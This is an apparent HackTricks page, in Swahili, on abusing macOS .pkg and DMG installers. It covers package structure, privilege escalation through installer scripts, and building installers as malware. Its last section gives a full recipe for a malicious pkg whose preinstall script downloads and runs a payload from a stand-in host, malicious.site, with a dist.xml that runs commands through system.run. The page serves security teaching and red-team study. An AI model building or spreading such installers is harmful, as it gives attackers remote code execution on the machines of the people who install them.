# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

Kifurushi cha **installer** cha macOS (pia kinachojulikana kama faili `.pkg`) ni muundo wa faili unaotumiwa na macOS ku **distribute software**. Faili hizi ni kama **sanduku linaloshikilia kila kitu ambacho kipande cha software** kinahitaji ili kufunga na kufanya kazi ipasavyo.

Faili la kifurushi lenyewe ni archive inayoshikilia **hifadhi ya faili na directories ambazo zitawekwa kwenye kompyuta ya lengo**. Pia linaweza kujumuisha **scripts** za kutekeleza kazi kabla na baada ya ufungaji, kama vile kuandaa faili za usanidi au kusafisha toleo za zamani za software.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Marekebisho (kichwa, maandiko ya karibisho…) na ukaguzi wa script/ufungaji
- **PackageInfo (xml)**: Taarifa, mahitaji ya ufungaji, eneo la ufungaji, njia za scripts za kutekeleza
- **Bill of materials (bom)**: Orodha ya faili za kufunga, kuboresha au kuondoa pamoja na ruhusa za faili
- **Payload (CPIO archive gzip compresses)**: Faili za kufunga katika `install-location` kutoka PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Scripts za kabla na baada ya ufungaji na rasilimali zaidi zilizotolewa kwenye directory ya muda kwa ajili ya utekelezaji.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Ili kuona maudhui ya mfunguo bila kuyakandamiza kwa mikono, unaweza pia kutumia zana ya bure [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## Taarifa za Msingi za DMG

Faili za DMG, au Picha za Disk za Apple, ni muundo wa faili unaotumiwa na macOS ya Apple kwa picha za diski. Faili ya DMG kimsingi ni **picha ya diski inayoweza kuunganishwa** (ina mfumo wake wa faili) ambayo ina data ya block mbichi ambayo mara nyingi imepandishwa na wakati mwingine imefungwa. Unapofungua faili ya DMG, macOS **inaunganisha kama vile ilikuwa diski halisi**, ikikuruhusu kufikia maudhui yake.

> [!CAUTION]
> Kumbuka kwamba **`.dmg`** waunganishaji wanaunga mkono **format nyingi sana** kwamba katika siku za nyuma baadhi yao walikuwa na udhaifu na kutumiwa kupata **utendaji wa msimbo wa kernel**.

### Hifadhi

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hifadhi ya faili ya DMG inaweza kuwa tofauti kulingana na maudhui. Hata hivyo, kwa DMGs za programu, kawaida inafuata muundo huu:

- Kiwango cha Juu: Hii ni mzizi wa picha ya diski. Mara nyingi ina programu na labda kiungo kwa folda ya Maombi.
- Programu (.app): Hii ni programu halisi. Katika macOS, programu kawaida ni kifurushi kinachojumuisha faili na folda nyingi zinazounda programu hiyo.
- Kiungo cha Maombi: Hii ni njia fupi kwa folda ya Maombi katika macOS. Kusudi la hii ni kurahisisha wewe kufunga programu. Unaweza kuvuta faili ya .app kwenye njia fupi hii ili kufunga programu.

## Privesc kupitia matumizi ya pkg

### Utekelezaji kutoka kwa saraka za umma

Ikiwa skripti ya kabla au baada ya ufungaji inatekelezwa kutoka **`/var/tmp/Installerutil`**, na mshambuliaji anaweza kudhibiti skripti hiyo ili apandishe mamlaka kila wakati inatekelezwa. Au mfano mwingine wa kufanana:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Hii ni [kazi ya umma](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) ambayo waunganishaji na wasasishaji kadhaa wataita ili **kutekeleza kitu kama root**. Kazi hii inakubali **njia** ya **faili** ya **kutekeleza** kama parameter, hata hivyo, ikiwa mshambuliaji anaweza **kubadilisha** faili hii, ataweza **kutumia** utekelezaji wake na root ili **kupandisha mamlaka**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
Kwa maelezo zaidi angalia hii hotuba: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Utekelezaji kwa kupandisha

Ikiwa mfunguo wa programu unaandika kwenye `/tmp/fixedname/bla/bla`, inawezekana **kuunda mount** juu ya `/tmp/fixedname` bila wamiliki ili uweze **kubadilisha faili yoyote wakati wa usakinishaji** ili kutumia mchakato wa usakinishaji.

Mfano wa hili ni **CVE-2021-26089** ambayo ilifanikiwa **kufuta script ya kawaida** ili kupata utekelezaji kama root. Kwa maelezo zaidi angalia hotuba: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg kama malware

### Payload Tupu

Inawezekana tu kuzalisha faili **`.pkg`** yenye **scripts za kabla na baada ya usakinishaji** bila payload halisi isipokuwa malware ndani ya scripts.

### JS katika xml ya Usambazaji

Inawezekana kuongeza **`<script>`** tags katika faili **xml ya usambazaji** ya kifurushi na hiyo code itatekelezwa na inaweza **kutekeleza amri** kwa kutumia **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

### Mfunguo wa Programu wa Nyuma

Mfunguo mbaya ukitumia script na JS code ndani ya dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Marejeo

- [**DEF CON 27 - Kufungua Pkgs Kuangalia Ndani ya Macos Installer Packages na Mapungufu ya Kawaida ya Usalama**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "Ulimwengu wa Kijani wa macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Kufungua Pkgs Kuangalia Ndani ya MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)

{{#include ../../../banners/hacktricks-training.md}}
